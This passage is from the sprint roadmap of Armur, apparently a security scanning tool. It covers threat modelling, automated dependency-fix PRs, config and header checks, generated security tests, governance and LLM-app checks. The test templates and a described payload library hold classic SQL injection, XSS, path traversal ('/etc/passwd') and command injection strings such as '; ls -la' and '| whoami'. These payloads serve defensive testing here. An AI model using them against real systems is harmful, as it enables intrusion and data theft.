    Internet --> AuthMiddleware
    AuthMiddleware --> POST_/api/users
    POST_/api/users --> UsersDB[(PostgreSQL)]
    POST_/api/users --> EmailService[SendGrid]
  ```
- [x] Output: `~/.armur/reports/<task-id>.threat-model.md` (Mermaid fenced code block)
- [x] `armur threatmodel <target>` dedicated command

#### 52.3 STRIDE Analysis per Component

- [x] For each detected entry point, run a STRIDE check:
  - **Spoofing**: is auth middleware present before this route?
  - **Tampering**: is input validation present (validator, binding)?
  - **Repudiation**: is request logging middleware present?
  - **Information Disclosure**: does the response include error details in production mode?
  - **DoS**: is rate limiting middleware present?
  - **Elevation of Privilege**: is authorization (role check) performed after authentication?
- [x] Each failing STRIDE check becomes a finding: `Category = "threat_model"`, severity based on the
  STRIDE category (Spoofing → HIGH, DoS → MEDIUM, Repudiation → LOW, etc.)

#### 52.4 Attack Surface Report

- [x] `armur attack-surface <target>` command — enumerate and output:
  - All public endpoints with their HTTP methods and auth status
  - File upload endpoints (flag separately — high attack surface)
  - Admin/management endpoints (`/admin`, `/debug`, `/metrics`, `/health`)
  - WebSocket upgrade endpoints
  - Unauthenticated endpoints (no auth middleware detected)
- [x] Output as a structured table in the terminal and as JSON in the report file

---

### Sprint 53 — Dependency Update [DONE] Automation (Auto-Fix PRs)

Manifest parsing uses stdlib text manipulation; GitHub/GitLab PR creation uses `net/http` + JSON.
The `gh` CLI (already used for releases) provides a fallback for GitHub.

#### 53.1 Safe Dependency Bump Engine

- [x] Implement `internal/depfix/bump.go`
- [x] For each SCA finding that has a `patched_version` field: compute the minimal safe version bump
- [x] Supported manifest formats (all parsed with Go stdlib + regex, no external parsers):
  - `go.mod` — use `golang.org/x/mod/modfile` (already in the Go module ecosystem)
  - `package.json` — stdlib `encoding/json`
  - `requirements.txt` — line-by-line text; update `package==version` → `package==patched`
  - `Cargo.toml` — TOML parsing (`pelletier/go-toml` — add dep)
  - `Gemfile.lock` — text replacement
  - `pom.xml` — XML parsing with `encoding/xml` stdlib
  - `pyproject.toml` — TOML parsing
- [x] Safety check: only bump within the same major version (semver) unless `--allow-major` flag set
- [x] `armur fix-deps --dry-run` — print what would change without writing to disk

#### 53.2 GitHub Pull Request Creation

- [x] `armur fix-deps --create-pr` — apply bumps, commit with `git`, push to a new branch, create PR
- [x] Branch name: `armur/fix-deps-<date>` (e.g., `armur/fix-deps-2026-03-11`)
- [x] Commit message: `fix(deps): patch N vulnerabilities (Armur auto-fix)`
- [x] PR title: `fix(deps): patch N critical/high vulnerabilities`
- [x] PR body template (Markdown table):
  ```markdown
  ## Security Dependency Updates (Armur)
  | Package | From | To | CVE | CVSS | Severity |
  |---------|------|----|-----|------|----------|
  | lodash  | 4.17.15 | 4.17.21 | CVE-2021-23337 | 7.2 | HIGH |
  ```
- [x] Use GitHub REST API via `net/http`: `POST /repos/:owner/:repo/pulls`
- [x] GitLab: `POST /projects/:id/merge_requests`
- [x] API tokens read from `armur config`: `armur config set github-token <token>`

#### 53.3 PR Policy Configuration

- [x] `.armur.yml` dep-update policy:
  ```yaml
  dep-updates:
    auto-pr: false          # set true to auto-create PRs after each scan
    group-by: severity      # one PR for all, or one per severity tier
    max-open-prs: 5         # don't flood the repo
    skip-major-bumps: true  # only patch/minor version bumps
    assignees: []           # GitHub usernames to assign
    labels: ["security", "dependencies"]
  ```
- [x] `armur fix-deps --schedule` — run on embedded cron (cron library already in go.mod: `robfig/cron`)

#### 53.4 Pre-Bump Safety Scan

- [x] Before creating the PR: run a quick in-process scan of the updated manifest to verify the bumped
  version does not introduce new vulnerabilities (query OSV API for the new version)
- [x] If new vulns found in the bump target: skip that package and add a note to the PR body

---

### Sprint 54 — Network [DONE] & Protocol Configuration Security

All checks are regex/grep on config files (nginx, Apache, Istio YAML) or YAML parsing using
`gopkg.in/yaml.v3` which is already in go.mod. No external tools required.

#### 54.1 TLS Configuration in Web Server Files

- [x] Implement `internal/tools/netconfig.go`
- [x] Walk repo for: `nginx.conf`, `nginx/*.conf`, `conf.d/*.conf`, `httpd.conf`, `apache2.conf`,
  `haproxy.cfg`, `traefik.yml`, `traefik.yaml`, `caddy`/`Caddyfile`
- [x] Regex-based checks (no full config parser needed — targeting specific directive lines):
  - `ssl_protocols` containing `TLSv1` or `TLSv1.1` → HIGH
  - `SSLProtocol` containing `+TLSv1` or `+TLSv1.1` → HIGH
  - Cipher string containing `RC4`, `3DES`, `NULL`, `EXPORT`, `DES` → HIGH
  - No `ssl_session_tickets off` → MEDIUM (session ticket key rotation risk)
  - No `resolver` configured for OCSP stapling → INFO

#### 54.2 HTTP Security Header Analysis

- [x] Check web server and application configs for missing security headers:
  - `add_header X-Frame-Options` missing → MEDIUM
  - `add_header X-Content-Type-Options nosniff` missing → MEDIUM
  - `add_header Strict-Transport-Security` missing → HIGH (if TLS is configured)
  - `add_header Content-Security-Policy` missing → MEDIUM
  - `add_header Referrer-Policy` missing → LOW
  - `Content-Security-Policy` value containing `unsafe-eval` or `unsafe-inline` → HIGH
- [x] Parse application-level header setting for Go (Gin middleware), Python (Flask/Django middleware),
  and Express (helmet.js usage) to check in-code header configuration

#### 54.3 Istio / Service Mesh Security

- [x] Parse Istio resource YAML files using `gopkg.in/yaml.v3` (already in go.mod):
  - `AuthorizationPolicy` with `action: ALLOW` and no `from` or `to` rules → CRITICAL
    (allows all traffic)
  - `PeerAuthentication` with `mtls.mode: DISABLE` or `mtls.mode: PERMISSIVE` → HIGH
  - `VirtualService` routing to HTTP (not HTTPS) backends → MEDIUM
- [x] Detect Istio resources by `apiVersion: security.istio.io/v1` or `networking.istio.io/v1`

#### 54.4 Protobuf / gRPC Security

- [x] Implement `internal/tools/protocheck.go`
- [x] Walk repo for `*.proto` files; parse with line-by-line text analysis (no full proto parser):
  - Service definitions with no auth comment / option annotation → INFO
  - Fields named `password`, `secret`, `token`, `api_key` without `(buf.validate.field).string.min_len` → MEDIUM
  - `stream` RPCs (potential DoS via long-lived connections without timeout options) → LOW
- [x] Detect `*.proto` files and add proto language to `armur doctor` tool check list

#### 54.5 Kubernetes Ingress & Network Policy

- [x] Parse `Ingress` resources: flag HTTP (non-TLS) backends → MEDIUM
- [x] Parse `NetworkPolicy` resources: flag absence of NetworkPolicy in a namespace → INFO
  (any pod can reach any other pod)
- [x] Flag `NetworkPolicy` with `podSelector: {}` and no `policyTypes` (matches all pods) → MEDIUM
- [x] Detect via `kind: Ingress` / `kind: NetworkPolicy` in YAML files

---

### Sprint 55 — Security Test [DONE] Generation

Pure Go code generation using `text/template` stdlib. No external tools, no new dependencies.
The output is test files (.go, .py, .js) generated from templates and written with `os.WriteFile`.

#### 55.1 Failing Test Generation from SAST Findings

- [x] Implement `internal/testgen/generator.go`
- [x] For each finding with a known exploit pattern, generate a test using language-specific templates:

  **SQL Injection (Go):**
  ```go
  func TestSQLInjection_<file>_<line>(t *testing.T) {
      payload := "' OR '1'='1"
      _, err := handler(payload)
      if err == nil {
          t.Fatal("expected error for SQL injection payload, got nil")
      }
  }
  ```

  **XSS (JavaScript/Jest):**
  ```js
  test('XSS: <file>:<line> should escape HTML', () => {
      const payload = '<script>alert(1)</script>';
      const result = renderFunction(payload);
      expect(result).not.toContain('<script>');
  });
  ```

  **Path Traversal (Python/pytest):**
  ```python
  def test_path_traversal_<file>_<line>():
      response = client.get('/file?path=../../../etc/passwd')
      assert response.status_code in (400, 403), "path traversal not blocked"
  ```

- [x] Templates stored in `internal/testgen/templates/<language>/<category>.tmpl`
- [x] `armur generate-tests --task <id> --language go` — output to `.armur/security-tests/`

#### 55.2 PoC Payload Library

- [x] `internal/testgen/payloads.go` — curated payload lists per vulnerability category:
  - SQL injection: 20 classic payloads (`' OR 1=1--`, `1; DROP TABLE users--`, etc.)
  - XSS: 15 payloads (`<img src=x onerror=alert(1)>`, `"><script>`, etc.)
  - Path traversal: 10 payloads (`../../../etc/passwd`, `..%2F..%2F`, etc.)
  - Command injection: 10 payloads (`; ls -la`, `| whoami`, `` `id` ``, etc.)
  - SSRF: internal IP ranges and metadata endpoint URLs
- [x] Payloads saved to `~/.armur/reports/<task-id>/poc/<finding-id>.txt` for reference
- [x] NOT automatically executed — displayed for manual verification only

#### 55.3 Regression Test Suite Generation

- [x] `armur generate-tests --regression --task <id>` — generate a security regression suite:
  - For each finding that was previously present and is now resolved: generate a test that asserts
    the fix holds (using the PoC payload against the fixed code path)
  - Tests written to `.armur/security-tests/regression_test.<ext>` in the repo
- [x] Include in README a section: "Run `go test ./.armur/security-tests/...` to verify security fixes"

#### 55.4 Fuzz Harness Generation

- [x] For each function flagged as vulnerable to injection-type findings:
  - Go: generate a `FuzzXxx(f *testing.F)` harness with the PoC payloads as seed corpus entries
  - Python: generate an Atheris harness with seed corpus
- [x] `armur generate-tests --fuzz --task <id>` — generate fuzz harnesses alongside unit tests
- [x] Output to `.armur/security-tests/fuzz_<finding-id>_test.<ext>`

---

## Phase 7: Scale & Intelligence (v4.0) — Sprints 56–59

Performance at scale, security governance, threat intelligence enrichment, and LLM application security.

---

### Sprint 56 — Performance [DONE] at Scale (Monorepos, Caching, Distributed Scanning)

#### 56.1 Monorepo Support

- [x] **Service detection**: detect services/modules within a monorepo by finding multiple `go.mod`, `package.json`, `pom.xml`, `pyproject.toml` files
- [x] **Per-service scanning**: scan each detected service independently in parallel; merge results with per-service labels
- [x] `armur run --monorepo` flag: explicitly enable monorepo mode with per-service breakdown in TUI
- [x] `armur run --service <name>` flag: scan only a specific named service within a monorepo
- [x] Result grouping in TUI: top-level tabs by service name; summary card shows per-service severity counts

#### 56.2 Scan Result Caching

- [x] **File-level caching**: compute SHA256 hash of each source file before scanning
  - If a file's hash matches a cache entry (stored in Redis), reuse cached tool results for that file
  - Only re-run tools on files that have changed since the last scan
  - Cache key: `cache:<repo-url>:<file-path>:<sha256>:<tool>`
- [x] **Tool result caching**: cache the full tool output keyed by `(tool_version + dir_hash)`; TTL: 24h
- [x] Cache invalidation: clear cache for a repo when any file in the repo changes
- [x] Cache hit rate reported in scan metadata: `"cache": { "hit_rate": 0.73, "files_from_cache": 147 }`
- [x] `armur cache clear` CLI command — flush all cached results

#### 56.3 Distributed Scanning (Multiple Workers)

- [x] Asynq already supports multiple workers — document and test multi-worker deployment
- [x] Add worker-aware task distribution: large repos split into sub-tasks (one per tool or one per service) for parallel execution across workers
- [x] Worker health reporting: each worker registers itself in Redis with heartbeat TTL; `GET /api/v1/workers` endpoint lists active workers
- [x] Priority queues: add `critical`, `default`, `low` Asynq queues; API key tier determines which queue tasks land in
- [x] Worker auto-scaling hints: `/metrics` endpoint exposes queue depth; publish Kubernetes HPA custom metrics example

#### 56.4 Large Repo Optimizations

- [x] Shallow clone by default: `git clone --depth=1` for repository scans (already fast; make explicit)
- [x] Sparse checkout for monorepos: only check out the specific service directory when `--service` is specified
- [x] File count limit with warning: if repo has > 50,000 files, warn and offer to scan only the top-level `--depth 3` directories
- [x] Memory limit for tool execution: set `ulimit -v` (virtual memory cap) per tool subprocess to prevent OOM on oversized repos
- [x] Incremental cache warm-up: on first scan, build file hash cache; subsequent scans are 5–10x faster

#### 56.5 Scan Queue Priority & Scheduling

- [x] `POST /api/v1/scan/repo` accepts optional `priority: critical|high|normal|low` field
- [x] Priority maps to Asynq queue: critical → immediately dequeued, low → background
- [x] `scheduled_at` field: schedule a scan for a future time (e.g., nightly at 02:00)
- [x] Recurring scan schedule: `cron: "0 2 * * *"` field in scan request — re-enqueues task on the given cron schedule
- [x] `armur schedule add <target> --cron "0 2 * * *"` CLI command for recurring scans

---

### Sprint 57 — Governance [DONE]: Verified Fixes, Regression Prevention & SLA Enforcement

Security fixes that silently reappear are a major enterprise pain point. This sprint makes Armur
into an active security guardian — not just a reporter — by verifying fixes, preventing regressions,
enforcing remediation timelines, tracking security debt, and managing suppressions.

#### 57.1 Verified Fix Workflow

When `armur fix --apply <id>` applies a patch, automatically re-scan to confirm the fix worked.

- [x] After `armur fix --apply <finding-id>`:
  1. Apply the patch to the file
  2. Immediately re-scan only the patched file (`armur scan --file <path> --in-process`)
  3. Check if the original finding is gone
  4. Check if the patch introduced any new findings
  5. Report result:
     - "Finding resolved. No new issues introduced." → delete the original finding from history
     - "Finding still present. The patch may be incomplete." → show the re-scan result
     - "Finding resolved but 1 new issue introduced." → show the new finding
- [x] Add `--verify` flag to `armur fix --apply --verify` to make verification explicit
- [x] Verified fixes are marked with `Finding.Status = "verified_fixed"` in the history DB

#### 57.2 Security Regression Detection

A regression is when a previously-fixed finding reappears in a new scan.

- [x] On each scan completion: compare findings against the previous scan for the same target
  - New findings (in current scan, not in previous): mark as `NEW` (shown in red in the TUI)
  - Regressed findings (fixed in a previous scan, back in current): mark as `REGRESSED` (shown in purple)
  - Resolved findings (in previous scan, not in current): mark as `FIXED` (shown in green)
  - Persistent findings (in both): mark as `OPEN`
- [x] Regression findings are automatically promoted one severity level (a regressed MEDIUM becomes HIGH — regression implies the team ignored a fix)
- [x] CI integration: `--fail-on-regression` flag — fail the CI build if any previously-fixed finding reappears
- [x] `armur compare --regression <task-id>` — show only regressed findings between two scans

#### 57.3 "Never Allow" Rules (Hard Security Gates)

Some vulnerabilities must never appear in a codebase — ever. Armur should enforce this as a
hard gate, distinct from severity thresholds.

- [x] `.armur.yml` `never-allow` configuration:
  ```yaml
  never-allow:
    - rule: "gosec.G401"      # MD5 usage — never acceptable
      message: "MD5 is cryptographically broken. Use SHA-256 or better."
    - cwe: "CWE-89"           # SQL injection — never acceptable
    - category: "secret_detection"  # hardcoded secrets — never acceptable
    - tool: "trufflehog"      # any trufflehog finding
  ```
- [x] If a `never-allow` finding is detected: exit code 2 (distinct from the normal exit code 1 for threshold violations)
- [x] In CI: `never-allow` violations block merge regardless of PR author permissions — this is a hard gate
- [x] `armur never-allow add <rule-id>` — add a rule to the never-allow list interactively
- [x] Display `never-allow` violations at the top of all results with a `[BLOCKED]` badge

#### 57.4 SLA Tracking & Enforcement

Security findings have deadlines. Tracking whether teams meet them is essential for compliance.

- [x] Define SLA policies in `.armur.yml` or via the web dashboard:
  ```yaml
  sla:
    critical: 1d      # 1 business day
    high: 7d          # 7 calendar days
    medium: 30d       # 30 calendar days
    low: 90d          # 90 calendar days
    info: 180d        # 6 months
  ```
- [x] When a finding first appears: record `Finding.DetectedAt` timestamp in the history DB
- [x] On each subsequent scan: compute `days_open = now - detected_at`; compare to SLA
- [x] SLA breach: finding is past its deadline → mark as `SLA_BREACHED`, promote severity by one level
- [x] SLA warning: finding is within 20% of its deadline → mark as `SLA_WARNING`
- [x] `armur sla report` — print a table of all open findings with days remaining / days overdue
- [x] SLA breach notifications: Slack/Teams/email alert when a finding enters SLA_BREACHED state
- [x] SLA compliance rate: `armur sla stats` — "72% of HIGH findings were fixed within SLA in the last 90 days"
- [x] Include SLA compliance rate in the executive PDF report

#### 57.5 Composite Risk Score per Finding

- [x] Add `RiskScore float64` field to the `Finding` struct
- [x] Compute in `internal/analysis/risk.go` after all tool results are merged:
  ```
  RiskScore = BaseScore
            × ExploitabilityMultiplier   (1.5 if CISA KEV, 1.2 if EPSS > 0.3, 1.0 otherwise)
            × AssetCriticalityMultiplier (1.5 if "critical", 1.2 if "high", 1.0 if "medium", 0.7 if "low")
            × ReachabilityMultiplier     (1.5 if reachable, 1.0 if unknown, 0.5 if unreachable)
  ```
- [x] BaseScore: CRITICAL=10, HIGH=7, MEDIUM=4, LOW=1, INFO=0.1
- [x] Asset criticality read from `.armur.yml: asset-criticality: high`
- [x] Default sort in TUI results browser changed to `RiskScore DESC` (from raw severity)

#### 57.6 Security Debt Tracker

Security debt is the accumulation of known issues that have been deferred. Quantifying it helps
teams prioritize and helps management understand risk.

- [x] Compute security debt score: `debt = sum(severity_weight x days_open)` for all open findings
  - CRITICAL x 20 per day, HIGH x 10 per day, MEDIUM x 3 per day, LOW x 1 per day
- [x] `armur debt` — print the current security debt score + trend (increasing/decreasing)
- [x] Display security debt trend in the HTML report: sparkline of debt score over last 30 scans
- [x] "Debt payoff planner": given the current team velocity (avg fixes per sprint), estimate how many sprints to reach zero critical debt
- [x] Alert when security debt score increases by > 20% in a single week (sudden new vulnerabilities introduced)

#### 57.7 Finding Suppression System

- [x] `armur suppress <finding-id> --reason "false positive" --expires 2026-12-31` command
- [x] Store suppressions in SQLite:
  ```sql
  CREATE TABLE IF NOT EXISTS suppressions (
      finding_id   TEXT PRIMARY KEY,
      reason       TEXT NOT NULL,
      suppressed_by TEXT,
      suppressed_at DATETIME,
      expires_at   DATETIME
  );
  ```
- [x] Inline suppression in source code: `// armur:ignore <rule-id>` or `# armur:ignore <rule-id>` parsed during scan; matching findings marked as suppressed
- [x] Expired suppressions auto-resurface on next scan (check `expires_at < now()`)
- [x] `armur suppressions list` — show all active suppressions with expiry dates
- [x] Suppressed findings counted separately in output: `17 findings (3 suppressed, not shown)`

#### 57.8 Executive Posture Report (PDF)

- [x] `armur report executive --task <id>` — multi-page PDF using `signintech/gopdf`:
  1. Cover page: target, scan date, posture score (large), grade letter
  2. Executive Summary: key metrics, top 3 risk drivers, trend vs previous scan
  3. Severity breakdown (ASCII-art bar chart embedded in PDF)
  4. SLA compliance: % of findings within SLA by severity tier
  5. Security debt: current debt in hours with trend
  6. Top 10 findings by risk score (one per row: file, description, risk score, SLA deadline)
  7. Recommended actions: prioritized list ordered by risk score
- [x] `armur report executive --format pdf` — explicitly request PDF; default is Markdown if no flag

---

### Sprint 58 — Threat Intelligence [DONE]: OpenSSF Scorecard, CISA KEV, EPSS & SLSA

#### 58.1 OpenSSF Scorecard Integration

The OpenSSF Scorecard assesses project-level security hygiene — things no SAST/SCA tool checks:
branch protection, signed releases, dependency update automation, CI security, etc.

- [x] **Scorecard CLI** integration: `scorecard --repo <url> --format json`
  - Run against the repository URL (not the local directory)
  - Parse `checks` array: each check has a `name`, `score` (0-10), and `reason`
  - Map checks with score < 5 to findings in a new `security_hygiene` category:
    - `Branch-Protection` score < 5 → HIGH: "Default branch has no protection rules"
    - `Signed-Releases` score < 5 → MEDIUM: "Releases are not cryptographically signed"
    - `Dependency-Update-Tool` score < 5 → MEDIUM: "No automated dependency updates configured (Dependabot/Renovate)"
    - `Token-Permissions` score < 5 → HIGH: "GitHub Actions workflows use excessive token permissions"
    - `Dangerous-Workflow` score < 1 → CRITICAL: "Dangerous CI workflow patterns detected (script injection, untrusted checkout)"
    - `Maintained` score < 1 → INFO: "Project appears unmaintained (no activity in 90 days)"
    - `Pinned-Dependencies` score < 5 → MEDIUM: "CI workflow dependencies are not pinned to commit hashes"
    - `Security-Policy` score < 5 → LOW: "No SECURITY.md or security policy found"
    - `Fuzzing` score < 5 → INFO: "No fuzzing integration found"
    - `SAST` score < 5 → INFO: "No SAST tool detected in CI (but you're using Armur, so fix this!)"
- [x] Scorecard findings appear in the main results browser under a "Security Hygiene" tab
- [x] `armur scorecard <repo-url>` — run Scorecard check standalone; print scored checklist
- [x] Include Scorecard score in the posture score calculation: `final_score = 0.7 x finding_score + 0.3 x scorecard_score`
- [x] Also run scorecard against top 10 direct dependencies: "Your dependency X has scorecard score 2/10"

#### 58.2 CISA KEV (Known Exploited Vulnerabilities) Enrichment

The CISA KEV catalog lists CVEs that are being **actively exploited in the wild right now**.
A KEV match is far more urgent than a theoretical CVE with a high CVSS score.

- [x] Fetch CISA KEV catalog: `GET https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json`
  - Cache locally in `~/.armur/cisa-kev.json`; refresh every 6 hours (or daily in offline mode)
  - Catalog contains ~1,200 CVEs (growing) with due dates and affected products
- [x] During SCA scanning: check every detected CVE against the KEV catalog
  - If match found: upgrade severity to `CRITICAL` regardless of CVSS score
  - Add `Finding.InCISAKEV = true` field
  - Add `Finding.CISADueDate` — the remediation due date CISA recommends for federal agencies
  - Message: "ACTIVELY EXPLOITED — This CVE is in the CISA Known Exploited Vulnerabilities catalog. Treat as P0."
- [x] Display KEV findings with a special `[KEV]` badge in the TUI and HTML report
- [x] `armur db update --kev` — force-refresh the KEV catalog immediately
- [x] `armur report kev --task <id>` — show only KEV findings with their CISA remediation deadlines

#### 58.3 EPSS (Exploit Prediction Scoring System) Integration

EPSS is a probability score (0–100%) predicting how likely a CVE is to be exploited in the next 30 days.

- [x] Fetch EPSS scores from the FIRST.org API: `GET https://api.first.org/data/1.0/epss?cve=CVE-XXXX`
- [x] Add `Finding.EPSSScore float64` (0.0–1.0) to SCA findings
- [x] Use EPSS in risk score calculation: `risk = cvss_score x (1 + epss_score) x reachability_multiplier`
- [x] Display EPSS as a percentage in the results table: "EPSS: 73% (high exploitation probability)"
- [x] Sort SCA findings by EPSS score by default (highest exploitation probability first)
- [x] Batch EPSS queries: collect all CVE IDs from the scan, send one HTTP request per batch of 30

#### 58.4 VEX (Vulnerability Exploitability eXchange) Support

- [x] Consume VEX documents: if `<project>.openvex.json` exists in the repo root, parse it and mark CVEs with `status: "not_affected"` or `status: "fixed"` as suppressed in SCA results
- [x] Generate VEX documents: `armur vex generate --task <id>` — creates `openvex.json` with all SCA findings mapped to OpenVEX statements (status defaults to `"under_investigation"`)
- [x] VEX format: OpenVEX (CISA standard — simple JSON, no library needed beyond `encoding/json`)
- [x] Store generated VEX documents at `~/.armur/vex/<project-id>.openvex.json`

#### 58.5 SLSA Compliance Checking

SLSA (Supply-chain Levels for Software Artifacts) is a framework for supply chain integrity.

- [x] Check SLSA Level 1 requirements for the scanned repository:
  - Scripted build (CI system detected) → check
  - Provenance generated (goreleaser with cosign signing detected) → check
  - Signed commits (GPG/SSH commit signing) → check `.gitconfig` or GitHub commit signature status
- [x] Check SLSA Level 2: hosted build platform + authenticated provenance
- [x] Check SLSA Level 3: provenance is signed (Sigstore/cosign artifacts in release) + no self-hosted runners
- [x] Check SLSA Level 4: hermetic builds (Bazel/Nix reproducible builds)
- [x] Report SLSA level achieved and gaps to reach next level
- [x] `armur slsa --repo <url>` — dedicated SLSA assessment command
- [x] Include SLSA level in the executive PDF report

#### 58.6 OSS-Fuzz Coverage Check

- [x] Query GitHub API to check if any direct dependency is an OSS-Fuzz integrated project
- [x] Cache the project list in Redis (1-hour TTL)
- [x] For each direct dependency NOT in OSS-Fuzz: emit `INFO` finding: "Dependency has no continuous fuzzing coverage"
- [x] For dependencies that ARE in OSS-Fuzz: add a positive note in the SCA section

---

### Sprint 59 — AI/LLM Application [DONE] Security (OWASP LLM Top 10)

All checks implemented as Semgrep rule packs + a small Go wrapper. Same implementation pattern
as all existing SAST tool integrations.

#### 59.1 LLM SDK Detection

- [x] Implement `internal/tools/llmsecurity.go`
- [x] Detect LLM SDK usage by scanning imports:
  - Go: `github.com/anthropics/anthropic-sdk-go`, `github.com/sashabaranov/go-openai`
  - Python: `import anthropic`, `import openai`, `from langchain`, `from llama_index`
  - JavaScript: `import Anthropic`, `require('openai')`, `from 'langchain'`
- [x] If no LLM SDK detected: skip this tool entirely (zero false positives for non-AI codebases)

#### 59.2 Prompt Injection Detection (LLM01)

- [x] Semgrep rules in `configs/semgrep/llm-security/prompt-injection.yaml`:
  - Python: f-string or `.format()` with user input variable directly concatenated into a prompt variable that is then passed to an LLM client completion call
  - JavaScript: template literal with user input directly in a `messages` array passed to `.create()`
  - Go: `fmt.Sprintf` with user input inside a string passed to the Anthropic/OpenAI SDK
- [x] Taint: source = HTTP request body / query param / form field; sink = LLM completion call argument
- [x] Finding message: `"User input directly interpolated into LLM prompt — prompt injection risk (OWASP LLM01)"`

#### 59.3 Insecure Output Handling (LLM02)

- [x] Semgrep rules in `configs/semgrep/llm-security/output-handling.yaml`:
  - LLM response content passed directly to `eval()` / `exec()` / `subprocess.run()` → CRITICAL
  - LLM response rendered as raw HTML without `html.EscapeString()` or template auto-escaping → HIGH
  - LLM response used as a SQL query fragment → CRITICAL
  - LLM response written to a filesystem path without sanitization → HIGH

#### 59.4 Excessive Agency Detection (LLM08)

- [x] Detect tool/function definitions in agentic LLM code:
  - Python: `tools=[{"name": ..., "function": ...}]` or LangChain `Tool` definitions
  - TypeScript: `tools: [{type: "function", function: {...}}]` in OpenAI tool arrays
- [x] Flag tool definitions that combine: filesystem write + network access + code execution in a single agent without human-in-the-loop confirmation logic
- [x] Flag: database write tools (`INSERT`, `UPDATE`, `DELETE`) with no human approval step

#### 59.5 OWASP LLM Top 10 Mapping & Report

- [x] Build `internal/compliance/owasp_llm.go` mapping table:
  - LLM01 Prompt Injection → prompt injection findings
  - LLM02 Insecure Output Handling → output handling findings
  - LLM06 Sensitive Information Disclosure → PII in prompt context
  - LLM08 Excessive Agency → agency detection findings
  - LLM09 Overreliance → missing fallback/error handling when LLM API fails
- [x] Add `Finding.OWASPLLM string` field (e.g., `"LLM01:2025"`)
- [x] `armur report llm --task <id>` — LLM security report
- [x] `armur llm-security <target>` — dedicated scan mode that runs only LLM security checks

---

## Backlog (Demand-Driven)

Features below are not scheduled. They will be prioritized based on user demand and community feedback.

- **Web3/Blockchain Deep**: Solidity (Slither, Mythril, solhint), Vyper, Move, Cairo, Rust WASM contracts
- **Mobile Security**: MobSF integration, apkleaks, jadx, iOS analysis, certificate pinning checks, OWASP MASVS reporting
- **Developer Security Gamification**: Developer security score (git blame), armur learn lessons, fix streak tracking, challenge mode
- **Team Features / RBAC / SSO**: Multi-user API with RBAC, finding assignment workflow, suppression management, OIDC/SAML SSO, audit log
- **Multi-Tenant Enterprise API**: Org/project data model, role-based access control, OIDC single sign-on, org-level audit log and aggregate analytics
- **Forensic Mode & Compromise Detection**: Repository history forensics, backdoor pattern detection, unauthorized change detection, malicious install hooks

---

*Last updated: March 2026*
